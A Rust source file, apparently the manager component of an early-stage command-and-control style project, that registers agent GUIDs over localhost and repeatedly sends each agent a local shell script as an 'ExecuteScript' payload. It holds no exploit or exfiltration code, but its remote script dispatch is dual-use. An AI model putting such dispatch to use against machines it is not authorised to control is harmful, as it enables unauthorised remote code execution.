// Need to do the planning on the manager. Manager moment.
// Once we get these two talking we can actually lay out the common protocol
// etc.
/*
use std::{io::prelude::*, thread::sleep, time::Duration};
#[path = "../../common/common.rs"]
mod common;
use common::*;

pub struct Manager {

}

impl Manager {
    pub fn new(ip:String, port:String)-> Self{

        Self {

        }
    }

}
*/

#[path = "../../common/mod.rs"]
mod common;
use std::{
    fs, io,
    sync::Arc,
    thread::{self, sleep},
    time::Duration,
};

use common::{networkinterface::*, parser::*, protocol::*, queue::*, *};

use command_types::*;
use parser::Parser;
use tui::{
    backend::CrosstermBackend,
    widgets::{Block, Borders},
    Terminal,
};

fn main() {
    let parser = Parser::new();
    let interface = NetworkInterface::new(
        ("127.0.0.1".to_string(), "6961".to_string()),
        ("127.0.0.1".to_string(), "6900".to_string()),
    );

    let inbound_queue = Arc::new(Queue::<Packet>::new());
    let outbound_queue = Arc::new(Queue::<Packet>::new());

    let mut guid_map: Vec<String> = vec![];

    listen_thread(&interface, &inbound_queue);
    send_thread(&interface, &outbound_queue);

    outbound_queue.push(parser.new_guid_post("127.0.0.1,6961".to_string()));

    outbound_queue.push(parser.new_guid_request());

    loop {
        sleep(Duration::new(5, 50000));
        if inbound_queue.is_empty() {
            continue;
        } else {
            let command = parser.ingest_response(inbound_queue.pop());
            println!("{:?}", command);

            if command.1 == "guid_sync" {
                for item in command.2 {
                    if item != parser.get_guid() && item.len() > 0 {
                        guid_map.push(item.to_string());
                    }
                }
            }
        }
        if guid_map.is_empty() {
            continue;
        } else {
            for item in &guid_map {
                let payload = CommandEnum::ExecuteScript(ExecuteScript{script:fs::read("/home/noah/Programming/rust/diamondback/src/common/armory/scripts/debugscript.sh").unwrap()});
                let encoded_payload = Parser::serialize_payload(payload);
                let outbound_packet = parser.new_payload(Some(item.to_owned()), encoded_payload);
                println!("Command serialized.");
                outbound_queue.push(outbound_packet);
            }
        }
    }
}
